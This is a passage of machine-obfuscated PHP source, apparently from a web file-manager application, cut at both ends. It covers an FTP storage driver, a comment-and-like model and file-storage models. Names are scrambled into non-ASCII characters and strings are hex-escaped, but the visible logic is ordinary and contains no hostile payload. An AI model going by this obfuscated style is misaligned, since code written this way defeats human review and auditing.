$_SERVER[¿ğÚ‰±–]; if (!$this->_isconn()) { return !1; } $ç´ù¤ª¢ = $ÉÚ ·Å‡ = array(); $this->fileList($ƒçÙíÙÈ, $ç´ù¤ª¢, $ÉÚ ·Å‡); foreach ($ç´ù¤ª¢ as $Æ•¡æˆŞ => $©™­—‘ø) { $ç´ù¤ª¢[$Æ•¡æˆŞ] = $this->folderInfo($©™­—‘ø, $ËŸ‹¾•‚); } foreach ($ÉÚ ·Å‡ as $Æ•¡æˆŞ => $©™­—‘ø) { $ÉÚ ·Å‡[$Æ•¡æˆŞ] = $this->fileInfo($©™­—‘ø[$²ÛÓº–Û[32]], $ËŸ‹¾•‚, $©™­—‘ø); } return array($²ÛÓº–Û[85] => $ç´ù¤ª¢, $²ÛÓº–Û[86] => $ÉÚ ·Å‡); } public function has($ú•¾éöŞ, $³‚ûæÉ = false, $ªıÂõŸ© = true) { $¢„Óë¼ =& $_SERVER[¿ğÚ‰±–]; $Š‰”à’ï = $Âì»¿äá = array(); $ò‘ß“°é = $³‚ûæÉ ? !0 : !1; $this->fileList($ú•¾éöŞ, $Š‰”à’ï, $Âì»¿äá, $ò‘ß“°é); if ($³‚ûæÉ) { return array($¢„Óë¼[239] => count($Âì»¿äá), $¢„Óë¼[240] => count($Š‰”à’ï)); } if ($ªıÂõŸ©) { if (count($Âì»¿äá)) { return !0; } } else { if (count($Š‰”à’ï)) { return !0; } } return !1; } public function listAll($´ôÕ»ùÓ) { $åÌóÖÂò =& $_SERVER[¿ğÚ‰±–]; if (!$this->_isconn()) { return !1; } $ öêŞãÅ = $ŸÓÁç = array(); $this->fileList($´ôÕ»ùÓ, $ öêŞãÅ, $ŸÓÁç, !0); $¡–Ûò«” = array_to_keyvalue($ŸÓÁç, $åÌóÖÂò[32]); foreach ($ öêŞãÅ as $§Ú Ø‚·) { if (is_string($§Ú Ø‚·)) { $¡–Ûò«”[$§Ú Ø‚·] = array($åÌóÖÂò[79] => 0); } } return $this->listAllFiles($´ôÕ»ùÓ, $¡–Ûò«”); } public function getContent($óÓÕğ€°) { if (!$this->_isconn()) { return !1; } $óÓÕğ€° = $this->iconvSystem($óÓÕğ€°); return $this->fileSubstr($óÓÕğ€°); } public function setContent($ùĞ”ò•, $Üá…Üè½ = '') { if (!$this->_isconn()) { return !1; } $«ÔÁ§Ïç = $this->pathThis($this->iconvSystem($ùĞ”ò•)); $ü°ğ¡–È = $this->tempFile($«ÔÁ§Ïç); file_put_contents($ü°ğ¡–È, $Üá…Üè½); $²î•Ö© = $this->upload($ùĞ”ò•, $this->iconvApp($ü°ğ¡–È)); $this->tempFileRemve($ü°ğ¡–È); return $²î•Ö©; } public function fileSubstr($·½øÄ‘‰, $º„´ ¬· = 0, $ç¦¼¶–ê = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($·½øÄ‘‰, $º„´ ¬·, $ç¦¼¶–ê); } private function ftpRequest($ı¼Ãš¿, $üóÌÀÃ§ = 0, $ÌßÎ´ÍÊ = false) { $ı¼Ãš¿ = $this->iconvSystem($ı¼Ãš¿); $èµÍ«ğû = $this->scheme . $this->host . $_SERVER[¿ğÚ‰±–][4] . $this->port; $´²›¶š¢ = curl_init(); curl_setopt($´²›¶š¢, CURLOPT_URL, $èµÍ«ğû . $this->pathEncode($ı¼Ãš¿)); curl_setopt($´²›¶š¢, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ÌßÎ´ÍÊ) { $‹¹¯ìŠĞ = $üóÌÀÃ§ + $ÌßÎ´ÍÊ - 1; curl_setopt($´²›¶š¢, CURLOPT_RANGE, "{$üóÌÀÃ§}\x2d{$‹¹¯ìŠĞ}"); } curl_setopt($´²›¶š¢, CURLOPT_RETURNTRANSFER, 1); $ º ¸şõ = curl_exec($´²›¶š¢); curl_close($´²›¶š¢); return $ º ¸şõ; } public function upload($›‹–¹Ö, $¢Ÿ¨ƒÂ, $…ô¯—¥Ø = false, $Œ‰­î€ø = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($›‹–¹Ö))) { return !1; } $›‹–¹Ö = $this->iconvSystem($›‹–¹Ö); $¢Ÿ¨ƒÂ = $this->iconvSystem($¢Ÿ¨ƒÂ); $³œÊÙ  = ftp_nb_put($this->connect, $›‹–¹Ö, $¢Ÿ¨ƒÂ, FTP_BINARY); while ($³œÊÙ  == FTP_MOREDATA) { $³œÊÙ  = ftp_nb_continue($this->connect); } if ($³œÊÙ  != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][1455], !0); return !1; } return $this->getPathOuter($›‹–¹Ö); } public function download($Å•ÃÉ÷, $ğĞ…»¡Î = '') { if (!$this->_isconn()) { return !1; } $êıåç¯Ş = $this->pathFather($ğĞ…»¡Î); if (!IO::mkdir($êıåç¯Ş)) { return !1; } $Å•ÃÉ÷ = $this->iconvSystem($Å•ÃÉ÷); $ğĞ…»¡Î = $this->iconvSystem($ğĞ…»¡Î); $â˜ŠÑ‘Ÿ = ftp_nb_get($this->connect, $ğĞ…»¡Î, $Å•ÃÉ÷, FTP_BINARY); while ($â˜ŠÑ‘Ÿ == FTP_MOREDATA) { $â˜ŠÑ‘Ÿ = ftp_nb_continue($this->connect); } if ($â˜ŠÑ‘Ÿ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][1455], !0); return !1; } return $this->iconvApp($ğĞ…»¡Î); } public function exist($¼ê¸ú¼) { return $this->isFile($¼ê¸ú¼) || $this->isFolder($¼ê¸ú¼); } public function isFile($‚‰ÃÜß) { return !$this->isFolder($‚‰ÃÜß) && $this->objectMeta($‚‰ÃÜß); } public function isFolder($ØÛ÷ÈŒì) { return $this->cacheMethod($_SERVER[¿ğÚ‰±–][179], $ØÛ÷ÈŒì); } protected function objectMeta($İÅÁı¤š) { return $this->cacheMethod($_SERVER[¿ğÚ‰±–][181], $İÅÁı¤š); } protected function _objectMeta($êè‘”ÄÉ) { $Ö‰¾øú¬ =& $_SERVER[¿ğÚ‰±–]; if ($êè‘”ÄÉ == $Ö‰¾øú¬[12] || $êè‘”ÄÉ == $Ö‰¾øú¬[8]) { return array(); } if (!$this->_isconn()) { return !1; } $êè‘”ÄÉ = $this->iconvSystem($êè‘”ÄÉ); $¤µ·Üı± = array($Ö‰¾øú¬[32] => $this->iconvApp($êè‘”ÄÉ), $Ö‰¾øú¬[33] => $Ö‰¾øú¬[230], $Ö‰¾øú¬[79] => 0); @ftp_chdir($this->connect, $Ö‰¾øú¬[8]); $‰Í¶¬è‚ = @ftp_size($this->connect, $êè‘”ÄÉ); if ($‰Í¶¬è‚ != -1) { $¤µ·Üı±[$Ö‰¾øú¬[79]] = $‰Í¶¬è‚; } else { $ÖÑİÚØ = @ftp_chdir($this->connect, $êè‘”ÄÉ); if (!$ÖÑİÚØ) { return !1; } $¤µ·Üı±[$Ö‰¾øú¬[33]] = $Ö‰¾øú¬[78]; } return $¤µ·Üı±; } protected function _isFolder($§¿µÒÎ‹) { $¨Ú·´ìâ =& $_SERVER[¿ğÚ‰±–]; if ($§¿µÒÎ‹ == $¨Ú·´ìâ[12] || $§¿µÒÎ‹ == $¨Ú·´ìâ[8]) { return !0; } $ßÔèğŠ = $this->_objectMeta($§¿µÒÎ‹); return isset($ßÔèğŠ[$¨Ú·´ìâ[33]]) && $ßÔèğŠ[$¨Ú·´ìâ[33]] == $¨Ú·´ìâ[78] ? !0 : !1; } } goto Fã†ºÀô®Ñ; c¬‘ò›ÓŸ¾: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\145\156\x74"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\155\145" => "\143\x6f\x6d\155\145\156\x74\x5f\155\145\164\x61", "\x6d\x65\x74\141\106\x69\145\154\x64" => "\143\x6f\x6d\155\x65\156\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÙÜüŞÏ­) { $Ï·ï´ßş =& $_SERVER[¿ğÚ‰±–]; if ($ÙÜüŞÏ­[$Ï·ï´ßş[2005]]) { $¤ó ”£Á = $this->where(array($Ï·ï´ßş[2006] => $ÙÜüŞÏ­[$Ï·ï´ßş[2005]]))->find(); if (!$¤ó ”£Á || $¤ó ”£Á[$Ï·ï´ßş[190]] != $ÙÜüŞÏ­[$Ï·ï´ßş[190]] || $¤ó ”£Á[$Ï·ï´ßş[569]] != $ÙÜüŞÏ­[$Ï·ï´ßş[569]]) { return !1; } $this->where(array($Ï·ï´ßş[2006] => $ÙÜüŞÏ­[$Ï·ï´ßş[2005]]))->setAdd($Ï·ï´ßş[2007], 1); } $ÙÜüŞÏ­[$Ï·ï´ßş[2008]] = 0; $ÙÜüŞÏ­[$Ï·ï´ßş[2007]] = 0; $ÙÜüŞÏ­[$Ï·ï´ßş[828]] = 1; return $this->add($ÙÜüŞÏ­); } public function commentCount($¦¬¦ëÅ, $Æ†€Ç›Ä, $Ò¿„ø­ = false) { $Š’ÉÊÎ› =& $_SERVER[¿ğÚ‰±–]; if (!$¦¬¦ëÅ) { return array(); } if (is_string($¦¬¦ëÅ) || is_int($¦¬¦ëÅ)) { $¦¬¦ëÅ = array($¦¬¦ëÅ); } $««ƒ‹Ö = array($Š’ÉÊÎ›[569], $Š’ÉÊÎ›[2009] => $Š’ÉÊÎ›[565]); $¤şìã¹ = array($Š’ÉÊÎ›[569] => array($Š’ÉÊÎ›[7], $¦¬¦ëÅ), $Š’ÉÊÎ›[190] => $Æ†€Ç›Ä); if ($Ò¿„ø­) { $¤şìã¹[$Š’ÉÊÎ›[1777]] = $Ò¿„ø­; } $ñ×ô­™Ÿ = $this->field($««ƒ‹Ö)->where($¤şìã¹)->group($Š’ÉÊÎ›[569])->select(); return array_to_keyvalue($ñ×ô­™Ÿ, $Š’ÉÊÎ›[569], $Š’ÉÊÎ›[565]); } public function starTarget($êé·›¡Ö, $›•Ğåšñ) { $”Ö–õƒô =& $_SERVER[¿ğÚ‰±–]; $÷ä€´ƒ¬ = $êé·›¡Ö + self::TYPE_STAR_OFFSET; $äâ¥®ï = array($”Ö–õƒô[1777] => USER_ID, $”Ö–õƒô[190] => $÷ä€´ƒ¬, $”Ö–õƒô[569] => $›•Ğåšñ); $æÖÛõƒ = $this->where($äâ¥®ï)->find(); if ($æÖÛõƒ) { return $this->where(array($”Ö–õƒô[475] => $æÖÛõƒ[$”Ö–õƒô[475]]))->delete(); } $­å³¶û¬ = array($”Ö–õƒô[2005] => 0, $”Ö–õƒô[1777] => USER_ID, $”Ö–õƒô[828] => 1, $”Ö–õƒô[171] => $”Ö–õƒô[12], $”Ö–õƒô[190] => $÷ä€´ƒ¬, $”Ö–õƒô[569] => $›•Ğåšñ, $”Ö–õƒô[2008] => 0, $”Ö–õƒô[2007] => 0); return $this->add($­å³¶û¬); } public function starTargetCount($î¢‹, $ÌöÄİš) { $‘Ò‡Ãø =& $_SERVER[¿ğÚ‰±–]; $××Ó° = $ÌöÄİš + self::TYPE_STAR_OFFSET; $ÏÇ½éğÒ = $this->commentCount($î¢‹, $××Ó°); $¡ŸÁ‚ø = $this->commentCount($î¢‹, $××Ó°, USER_ID); return array($‘Ò‡Ãø[2010] => $ÏÇ½éğÒ, $‘Ò‡Ãø[2011] => $¡ŸÁ‚ø); } public function starTargetUserList($—ËàƒÆù, $ß±¨½Òº) { $Ë¶µÈÔ† =& $_SERVER[¿ğÚ‰±–]; $İ½•øÓß = $—ËàƒÆù + self::TYPE_STAR_OFFSET; $«‘¸¥¦ú = array($Ë¶µÈÔ†[569] => $ß±¨½Òº, $Ë¶µÈÔ†[190] => $İ½•øÓß); $òª¨Ñ” = $this->where($«‘¸¥¦ú)->count(); $ŸÛí±¼¬ = array($Ë¶µÈÔ†[332] => $òª¨Ñ”, $Ë¶µÈÔ†[2012] => array()); if (!$òª¨Ñ”) { return $ŸÛí±¼¬; } $ç®ôİè = $this->field($Ë¶µÈÔ†[1777])->where($«‘¸¥¦ú)->limit(500)->select(); $ç®ôİè = array_to_keyvalue($ç®ôİè, $Ë¶µÈÔ†[12], $Ë¶µÈÔ†[1777]); $ŸÛí±¼¬[$Ë¶µÈÔ†[2012]] = Model($Ë¶µÈÔ†[577])->userListInfo($ç®ôİè); return $ŸÛí±¼¬; } public function prasiseUserList($ÈåïŞ¦) { $Ù£Ï‹üú =& $_SERVER[¿ğÚ‰±–]; $ğéÂé› = array($Ù£Ï‹üú[2013] => $ÈåïŞ¦); $èèß¦Å§ = $this->where($ğéÂé›)->find(); $àİ’®Üã = _get($èèß¦Å§, $Ù£Ï‹üú[2008], 0); $ïä÷ÍÎõ = array($Ù£Ï‹üú[332] => $àİ’®Üã, $Ù£Ï‹üú[2012] => array()); if (!$àİ’®Üã) { return $ïä÷ÍÎõ; } $¸—ÆòŞ› = Model($Ù£Ï‹üú[2014])->field($Ù£Ï‹üú[1777])->where($ğéÂé›)->limit(500)->select(); $¸—ÆòŞ› = array_to_keyvalue($¸—ÆòŞ›, $Ù£Ï‹üú[12], $Ù£Ï‹üú[1777]); $ïä÷ÍÎõ[$Ù£Ï‹üú[2012]] = Model($Ù£Ï‹üú[577])->userListInfo($¸—ÆòŞ›); return $ïä÷ÍÎõ; } public function remove($šº¤éî·) { $ÑÔˆ´ôÌ =& $_SERVER[¿ğÚ‰±–]; $ÁÚ©÷Î‡ = array($ÑÔˆ´ôÌ[2006] => $šº¤éî·); $™‹¾‘õİ = $this->where($ÁÚ©÷Î‡)->find(); if ($™‹¾‘õİ[$ÑÔˆ´ôÌ[2005]]) { $this->where(array($ÑÔˆ´ôÌ[2006] => $™‹¾‘õİ[$ÑÔˆ´ôÌ[2005]]))->setAdd($ÑÔˆ´ôÌ[2007], -1); } return $this->where($ÁÚ©÷Î‡)->delete(); } public function edit($¡ ã­“½, $Ê¥ƒªŒ) { $€Ì÷‚„§ =& $_SERVER[¿ğÚ‰±–]; $Œ¾²ã› = array($€Ì÷‚„§[2006] => $¡ ã­“½); return $this->where($Œ¾²ã›)->save(array($€Ì÷‚„§[2015] => $Ê¥ƒªŒ)); } public function prasise($ø²àÖó˜) { $º×ËÁ€Í =& $_SERVER[¿ğÚ‰±–]; $µÕÊÏî = Model($º×ËÁ€Í[2016]); $ûàæ¡† = array($º×ËÁ€Í[2006] => $ø²àÖó˜, $º×ËÁ€Í[1768] => USER_ID); $åç¢»¼ = $µÕÊÏî->where($ûàæ¡†)->find(); if (!$åç¢»¼) { $µÕÊÏî->add($ûàæ¡†); $²ÛÉëÀä = $this->where(array($º×ËÁ€Í[2006] => $ø²àÖó˜))->setAdd($º×ËÁ€Í[2008], 1); } else { $µÕÊÏî->where($ûàæ¡†)->delete(); $²ÛÉëÀä = $this->where(array($º×ËÁ€Í[2006] => $ø²àÖó˜))->setAdd($º×ËÁ€Í[2008], -1); } return $²ÛÉëÀä; } public function targetInfo($Í‚ø˜‘, $¸Œõ½á˜) { $¡…ù²¾á =& $_SERVER[¿ğÚ‰±–]; $×ú®¯û– = array($¡…ù²¾á[648] => $Í‚ø˜‘, $¡…ù²¾á[649] => $¸Œõ½á˜); $ÑÅóˆ» = $this->where($×ú®¯û–)->count(); $©–‰³ˆ¾ = "\122\111\107\x48\x54\x20\x4a\117\x49\116\x20{$this->tablePrefix}\x63\x6f\x6d\x6d\x65\156\164\137\160\x72\x61\151\163\x65\x20\x73\164\141\x72\40\x6f\156\x20\x63\x6f\155\x6d\x65\156\164\x2e\x63\x6f\x6d\155\x65\x6e\164\x49\x44\x20\75\x20\x73\164\141\162\x2e\143\157\155\155\x65\x6e\164\111\104"; $˜ùıÏªÍ = $this->alias($¡…ù²¾á[430])->where($×ú®¯û–)->join($©–‰³ˆ¾, $¡…ù²¾á[2017])->count(); $¬åöĞÄ± = array($¡…ù²¾á[2018] => $ÑÅóˆ», $¡…ù²¾á[2019] => $˜ùıÏªÍ); return $¬åöĞÄ±; } public function listData($øÜâ«š¸) { $„®½ïŞ =& $_SERVER[¿ğÚ‰±–]; if (isset($øÜâ«š¸[$„®½ïŞ[2020]])) { if ($øÜâ«š¸[$„®½ïŞ[2020]]) { $øÜâ«š¸[$„®½ïŞ[2013]] = array($„®½ïŞ[1099], intval($øÜâ«š¸[$„®½ïŞ[2020]])); } unset($øÜâ«š¸[$„®½ïŞ[2020]]); } if (isset($øÜâ«š¸[$„®½ïŞ[2021]])) { if ($øÜâ«š¸[$„®½ïŞ[2021]]) { $øÜâ«š¸[$„®½ïŞ[2013]] = array($„®½ïŞ[1096], intval($øÜâ«š¸[$„®½ïŞ[2021]])); } unset($øÜâ«š¸[$„®½ïŞ[2021]]); } return $this->_listData($øÜâ«š¸); } private function _listData($ãêÍÚ«ù) { $·Ñº°³† =& $_SERVER[¿ğÚ‰±–]; $·¸ºúÜ« = $this->where($ãêÍÚ«ù)->_makeOrder()->selectPage(100); $this->_listAppendParent($·¸ºúÜ«[$·Ñº°³†[445]]); $this->_listAppendUser($·¸ºúÜ«[$·Ñº°³†[445]]); $this->_listAppendMeta($·¸ºúÜ«[$·Ñº°³†[445]]); return $·¸ºúÜ«; } private function _makeOrder() { $ñïÎµ‡† =& $_SERVER[¿ğÚ‰±–]; $Ã·Ú™š = array($ñïÎµ‡†[2008], $ñïÎµ‡†[2007], $ñïÎµ‡†[231]); $¸¹ÑÔ–½ = Input::get($ñïÎµ‡†[530], $ñïÎµ‡†[7], $ñïÎµ‡†[497], $Ã·Ú™š); $…¥ÒÙ» = Input::get($ñïÎµ‡†[531], $ñïÎµ‡†[7], $ñïÎµ‡†[1770], array($ñïÎµ‡†[2022], $ñïÎµ‡†[526])); $ÙíçÅß = $¸¹ÑÔ–½ . $ñïÎµ‡†[53] . $…¥ÒÙ»; return $this->order($ÙíçÅß); } private function _listAppendParent(&$‹¾şéåû) { $¥Íæú¥‡ =& $_SERVER[¿ğÚ‰±–]; $á„–ïÃü = array_unique(array_to_keyvalue($‹¾şéåû, $¥Íæú¥‡[12], $¥Íæú¥‡[2005])); $á„–ïÃü = array_remove_value($á„–ïÃü, $¥Íæú¥‡[228]); if (!$á„–ïÃü) { return; } $—õŠ•º = $this->where(array($¥Íæú¥‡[2006] => array($¥Íæú¥‡[7], $á„–ïÃü)))->select(); $—õŠ•º = array_to_keyvalue($—õŠ•º, $¥Íæú¥‡[2013]); foreach ($‹¾şéåû as &$ºë•˜Úë) { if (isset($—õŠ•º[$ºë•˜Úë[$¥Íæú¥‡[2005]]])) { $ºë•˜Úë[$¥Íæú¥‡[2023]] = $—õŠ•º[$ºë•˜Úë[$¥Íæú¥‡[2005]]]; } } unset($ºë•˜Úë); } private function _listAppendUser(&$ØØğßÙğ) { $ËË°Ñ€ß =& $_SERVER[¿ğÚ‰±–]; $¥„şÌı¯ = array_unique(array_to_keyvalue($ØØğßÙğ, $ËË°Ñ€ß[12], $ËË°Ñ€ß[1777])); $¥„şÌı¯ = array_remove_value($¥„şÌı¯, $ËË°Ñ€ß[228]); if (count($¥„şÌı¯) == 0) { return; } foreach ($ØØğßÙğ as $‡œã½äê) { if (isset($‡œã½äê[$ËË°Ñ€ß[2023]])) { $¥„şÌı¯[] = $‡œã½äê[$ËË°Ñ€ß[2023]][$ËË°Ñ€ß[1777]]; } } $ò†ª·¯ = Model($ËË°Ñ€ß[598])->userListInfo($¥„şÌı¯); foreach ($ØØğßÙğ as &$‡œã½äê) { $‡œã½äê[$ËË°Ñ€ß[662]] = $ò†ª·¯[$‡œã½äê[$ËË°Ñ€ß[1777]]]; if (isset($‡œã½äê[$ËË°Ñ€ß[2023]])) { $‡œã½äê[$ËË°Ñ€ß[2023]][$ËË°Ñ€ß[662]] = $ò†ª·¯[$‡œã½äê[$ËË°Ñ€ß[2023]][$ËË°Ñ€ß[1777]]]; } } unset($‡œã½äê); } private function _listAppendMeta(&$¬…™ùë´) { $ªâ¤ãÂÄ =& $_SERVER[¿ğÚ‰±–]; $…œ½×´İ = array_unique(array_to_keyvalue($¬…™ùë´, $ªâ¤ãÂÄ[12], $ªâ¤ãÂÄ[2013])); $…œ½×´İ = array_remove_value($…œ½×´İ, $ªâ¤ãÂÄ[228]); if (!$…œ½×´İ) { return; } foreach ($¬…™ùë´ as $×ã×ß‡) { if (isset($×ã×ß‡[$ªâ¤ãÂÄ[2023]])) { $…œ½×´İ[] = $×ã×ß‡[$ªâ¤ãÂÄ[2023]][$ªâ¤ãÂÄ[2013]]; } } $†ó¢€·§ = $this->metaList($…œ½×´İ); if (!$†ó¢€·§) { return !1; } foreach ($¬…™ùë´ as &$×ã×ß‡) { $×ã×ß‡[$ªâ¤ãÂÄ[539]] = $†ó¢€·§[$×ã×ß‡[$ªâ¤ãÂÄ[2013]]]; if (isset($×ã×ß‡[$ªâ¤ãÂÄ[2023]])) { $×ã×ß‡[$ªâ¤ãÂÄ[2023]][$ªâ¤ãÂÄ[539]] = $†ó¢€·§[$×ã×ß‡[$ªâ¤ãÂÄ[2023]][$ªâ¤ãÂÄ[2013]]]; } } unset($×ã×ß‡); } private function metaList($Şş á»á) { $‡ÍÆñİŠ =& $_SERVER[¿ğÚ‰±–]; if (!$Şş á»á) { return array(); } $¹µåë§œ = array($‡ÍÆñİŠ[2013] => array($‡ÍÆñİŠ[7], $Şş á»á)); $³¥¼ÓÅå = Model($‡ÍÆñİŠ[2024])->where($¹µåë§œ)->select(); $³¥¼ÓÅå = array_to_keyvalue_group($³¥¼ÓÅå, $‡ÍÆñİŠ[2013]); foreach ($³¥¼ÓÅå as $ÌÀ—ÖÊ£ => $ è•­·Ÿ) { $í´ê³ÂÄ = array(); foreach ($ è•­·Ÿ as $àüöó¢î) { $í´ê³ÂÄ[$àüöó¢î[$‡ÍÆñİŠ[97]]] = $àüöó¢î[$‡ÍÆñİŠ[450]]; } $³¥¼ÓÅå[$ÌÀ—ÖÊ£] = $í´ê³ÂÄ; } return $³¥¼ÓÅå ? $³¥¼ÓÅå : array(); } public function removeTarget($Û”íıò½, $—şê­Ë) { $¤Ïğ‹ø =& $_SERVER[¿ğÚ‰±–]; if (!$—şê­Ë) { return !0; } $—şê­Ë = is_array($—şê­Ë) ? $—şê­Ë : array($—şê­Ë); $Š’ö’ÌŸ = array($¤Ïğ‹ø[190] => $Û”íıò½, $¤Ïğ‹ø[569] => array($¤Ïğ‹ø[7], $—şê­Ë)); $ÌøÛ”¤î = $this->field($¤Ïğ‹ø[2013])->where($Š’ö’ÌŸ)->select(); $©É›©½© = array_to_keyvalue($ÌøÛ”¤î, $¤Ïğ‹ø[12], $¤Ïğ‹ø[2013]); if (!$©É›©½©) { return !0; } $Š’ö’ÌŸ = array($¤Ïğ‹ø[2013] => array($¤Ïğ‹ø[7], $©É›©½©)); $this->where($Š’ö’ÌŸ)->delete(); Model($¤Ïğ‹ø[2016])->where($Š’ö’ÌŸ)->delete(); Model($¤Ïğ‹ø[2025])->where($Š’ö’ÌŸ)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\x65\x5f\x63\x6f\156\164\x65\156\x74\163"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\x54\151\x6d\145", "\x74\151\x6d\x65", "\x69\x6e\163\x65\162\164", "\x66\x75\x6e\143\164\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\145"; protected $tableMeta = array("\164\x61\142\x6c\145\116\x61\155\145" => "\151\157\137\x66\151\154\x65\137\x6d\x65\x74\x61", "\155\x65\164\x61\x46\151\x65\154\x64" => "\146\151\x6c\x65\111\104"); public function fileInfo($¡”ÙÁ«§) { $°ĞÀ‘–Œ =& $_SERVER[¿ğÚ‰±–]; static $ŸåĞÑ = array(); if (!isset($ŸåĞÑ[$¡”ÙÁ«§])) { $ô¦èÄ˜‡ = $°ĞÀ‘–Œ[2026]; $ÒõÙ•ñº = Model($°ĞÀ‘–Œ[544])->field($ô¦èÄ˜‡)->where(array($°ĞÀ‘–Œ[542] => $¡”ÙÁ«§))->find(); $ŸåĞÑ[$¡”ÙÁ«§] = $ÒõÙ•ñº; } return $ŸåĞÑ[$¡”ÙÁ«§]; } public function addFileByContent($¼ÙôÏõ = '', $‚ŞğÇˆ± = '') { $ü›Ú¿’ô =& $_SERVER[¿ğÚ‰±–]; $Õ™›Üíª = TEMP_PATH . $ü›Ú¿’ô[2027]; if (!is_dir($Õ™›Üíª)) { mk_dir($Õ™›Üíª); } $Øùºï²À = $Õ™›Üíª . $ü›Ú¿’ô[2028] . rand_string(16); file_put_contents($Øùºï²À, $¼ÙôÏõ); $ú§üö©Õ = $this->addFile($Øùºï²À, $‚ŞğÇˆ±, !0); if (file_exists($Øùºï²À)) { @unlink($Øùºï²À); } return $ú§üö©Õ; } public function createFileName($ÓÌ»², $±ÚÙšÒ› = false, $Å¹¿®¹İ = false) { $„¯Í¢õ =& $_SERVER[¿ğÚ‰±–]; $…®æ¾ = IO::init($„¯Í¢õ[8]); $¨‹ÚïÍ = $this->makeFilePath($ÓÌ»², $…®æ¾, $±ÚÙšÒ›, $Å¹¿®¹İ); $ûƒöÌ¯± = $…®æ¾->pathFather($¨‹ÚïÍ); static $œ„ö‡“Ã = false; $öùÕÁĞï = $„¯Í¢õ[2029] . md5($ûƒöÌ¯±); if (!$œ„ö‡“Ã && !Cache::get($öùÕÁĞï)) { $œ„ö‡“Ã = !0; $ë¾èÒ³Ø = IO::mkdir($ûƒöÌ¯±); if (!IO::exist($ë¾èÒ³Ø . $„¯Í¢õ[875])) { IO::mkfile($ë¾èÒ³Ø . $„¯Í¢õ[875]); } Cache::set($öùÕÁĞï, 1, 3600 * 2); } return $¨‹ÚïÍ; } public function makeFilePath($—­°«æË, $ØÖÈ”™ç, $Êµ©¨‡… = false, $„Öä¬ = false) { $¹ˆÅØØŸ =& $_SERVER[¿ğÚ‰±–]; $ØŒ¢¤—ä = Model($¹ˆÅØØŸ[848])->get($¹ˆÅØØŸ[2030]); $³Ê¨š» = KodIO::defaultIO() . date($¹ˆÅØØŸ[2031]); $µçÇ‡ù = $³Ê¨š» . rand_string(5) . short_id(100); $—­°«æË = str_replace($¹ˆÅØØŸ[8], $¹ˆÅØØŸ[11], KodIO::clear($—­°«æË)); $«·ÕË˜ = $ØÖÈ”™ç->ext($—­°«æË); if (!$—­°«æË) { $ØŒ¢¤—ä = $¹ˆÅØØŸ[854]; } switch ($ØŒ¢¤—ä) { case $¹ˆÅØØŸ[2032]: if ($«·ÕË˜) { $µçÇ‡ù = $µçÇ‡ù . $¹ˆÅØØŸ[10] . $«·ÕË˜; } if ($«·ÕË˜ == $¹ˆÅØØŸ[1968]) { $µçÇ‡ù .= $¹ˆÅØØŸ[1298]; } break; case $¹ˆÅØØŸ[2033]: $çÔèüŒÕ = Model($¹ˆÅØØŸ[848])->get($¹ˆÅØØŸ[849]); $ …½û¢¸ = substr(md5($¹ˆÅØØŸ[850] . $çÔèüŒÕ . date($¹ˆÅØØŸ[827])), 0, 8); $´¬ÜÚ¯ = KodIO::defaultDriver(); $³Ê¨š» = $¹ˆÅØØŸ[1329] . $´¬ÜÚ¯[$¹ˆÅØØŸ[475]] . $¹ˆÅØØŸ[484] . date($¹ˆÅØØŸ[2034]) . $ …½û¢¸ . $¹ˆÅØØŸ[8]; if ($«·ÕË˜ == $¹ˆÅØØŸ[1968]) { $—­°«æË .= $¹ˆÅØØŸ[1298]; } $åçÄ Âï = $¹ˆÅØØŸ[2035] . $³Ê¨š» . $—­°«æË; CacheLock::lock($åçÄ Âï); $µçÇ‡ù = $³Ê¨š» . $—­°«æË; if (IO::exist($³Ê¨š» . $—­°«æË)) { $€™Ú­´ü = substr($—­°«æË, 0, strlen($—­°«æË) - strlen($«·ÕË˜)); $õŠ‚­¬Ê = $„Öä¬ ? substr($„Öä¬, 0, 5) : ($Êµ©¨‡… ? substr($Êµ©¨‡…, 0, 5) : rand_string(5)); $µçÇ‡ù = $³Ê¨š» . $€™Ú­´ü . $õŠ‚­¬Ê; if ($«·ÕË˜) { $µçÇ‡ù = $µçÇ‡ù . $¹ˆÅØØŸ[10] . $«·ÕË˜; } } if (IO::isOsDriver($µçÇ‡ù) && !IO::isUploadServer($µçÇ‡ù)) { if (IO::exist($µçÇ‡ù)) { return $µçÇ‡ù; } $•ÑÓ‚‰ = IO::setContent($µçÇ‡ù, $¹ˆÅØØŸ[12]); if (!$•ÑÓ‚‰) { show_json($¹ˆÅØØŸ[2036], !1); } } CacheLock::unlock($åçÄ Âï); break; case $¹ˆÅØØŸ[854]: break; default: break; } return $µçÇ‡ù; } public function addFileByRemote($Î¼ÑœÅ×, $í³‹ôÙ, $ÏîŸëªú = array()) { $ø¶€ı =& $_SERVER[¿ğÚ‰±–]; if (!IO::exist($Î¼ÑœÅ×)) { return !1; } $©°›¨Ì = $ÏîŸëªú[$ø¶€ı[547]] ? $ÏîŸëªú[$ø¶€ı[547]] : $ø¶€ı[12]; $ÍÅô¤¹¦ = IO::hashMd5($Î¼ÑœÅ×, $©°›¨Ì); $°Û¥İ° = KodIO::defaultDriver(); $½³­ı… = array($ø¶€ı[617] => IO::size($Î¼ÑœÅ×), $ø¶€ı[2037] => 1, $ø¶€ı[494] => $í³‹ôÙ, $ø¶€ı[886] => $°Û¥İ°[$ø¶€ı[475]], $ø¶€ı[495] => $Î¼ÑœÅ×, $ø¶€ı[2038] => $ÏîŸëªú[$ø¶€ı[672]] ? $ÏîŸëªú[$ø¶€ı[672]] : 